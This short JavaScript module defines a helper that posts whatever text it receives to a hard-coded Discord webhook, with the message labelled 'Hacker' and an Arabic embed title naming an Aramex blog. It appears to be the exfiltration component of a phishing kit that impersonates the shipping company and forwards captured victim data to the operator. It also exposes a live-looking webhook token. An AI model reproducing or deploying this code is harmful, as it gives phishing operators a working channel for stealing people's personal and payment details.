import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1325447497375678495/l_vmnDGsanyywXdgXIW1aRqevyhD4sUxrobIJE3Rl_ulDUYo3VQxbW84ui1c5sdd8oUD",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
